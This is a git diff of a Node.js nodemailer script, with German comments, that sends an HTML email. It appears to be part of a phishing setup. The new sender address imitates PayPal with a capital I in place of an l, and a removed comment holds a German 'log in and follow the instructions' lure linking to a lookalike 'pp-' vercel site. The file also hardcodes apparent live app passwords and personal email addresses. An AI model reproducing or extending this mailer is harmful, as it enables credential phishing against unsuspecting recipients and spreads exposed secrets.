@@ -3,23 +3,26 @@ const fs = require("fs");
 
 const html = fs.readFileSync("./mail.html", "utf8");
 
-// TODO: HIER EINTRAGEN
-const GMAIL_USER = "holzerluis3@gmail.com";
-const GMAIL_APP_PASS = "zcgyiglaavyxobem";
-const TO = "jonasbenz25@gmail.com";
+// OUTLOOK DATEN
+const OUTLOOK_USER = "paypaI.benz.login@outlook.com"; // z.B. name@outlook.de
+const OUTLOOK_APP_PASS = "ymctbncbixsrimnq";
+const TO = "jonasbenz25@gmail.com"; // zum Test auch deine eigene Adresse ok
 
 async function main() {
   const transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: { user: GMAIL_USER, pass: GMAIL_APP_PASS },
+    service: "outlook",
+    auth: {
+      user: OUTLOOK_USER,
+      pass: OUTLOOK_APP_PASS,
+    },
   });
 
   const info = await transporter.sendMail({
-    from: `"thomas" <${GMAIL_USER}>`,
+    from: `"Thomas" <${OUTLOOK_USER}>`,
     to: TO,
-    subject: "testhtml versuch",
+    subject: "HTML Testmail (Outlook SMTP)",
     html,
-    text: "das siehst du dann",
+    text: "Das ist die Text-Version der Mail.",
   });
 
   console.log("Gesendet:", info.messageId);
@@ -29,4 +32,3 @@ main().catch((err) => {
   console.error("Fehler:", err);
   process.exit(1);
 });
-//Bitte logge dich ein und folge den Anweisungen auf unserer Website. https://pp-five-silk.vercel.app/ 
